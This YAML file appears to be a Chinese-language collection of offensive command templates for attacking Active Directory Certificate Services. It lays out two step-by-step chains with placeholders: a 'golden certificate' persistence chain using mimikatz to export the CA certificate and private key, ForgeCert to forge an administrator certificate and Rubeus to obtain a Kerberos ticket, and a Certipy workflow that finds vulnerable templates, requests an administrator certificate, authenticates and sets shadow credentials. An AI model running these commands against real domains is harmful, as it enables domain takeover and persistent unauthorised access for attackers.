# 黄金证书
golden_certificate:
  - template: |
      # 黄金证书 - 持久化技术

      # 1. 获取CA证书

      mimikatz.exe crypto::certificates /export

      # 2. 提取CA私钥

      mimikatz.exe crypto::CA /export

      # 3. 伪造任意用户证书

      # 使用ForgeCert
      ForgeCert.exe --CaCertPath ca.pfx --CaPrivateKeyPath key.pem \
        --Subject 'CN=administrator' --SubjectAltName 'administrator@domain.local'

      # 4. 使用伪造证书认证

      Rubeus.exe asktgt /user:administrator /certificate:forge.pfx

# Certipy完整攻击流程
certipy_workflow:
  - template: |
      # Certipy ADCS攻击

      # 1. 信息收集
      certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable

      # 2. 请求证书
      certipy req -u 'user@domain.local' -p 'password' \
        -ca 'CA_NAME' -template 'Template' -alt 'administrator'

      # 3. 使用证书认证
      certipy auth -pfx administrator.pfx -domain domain.local

      # 4. 持久化
      certipy shadow -u 'administrator@domain.local' -p 'password' -target 'Target_User'

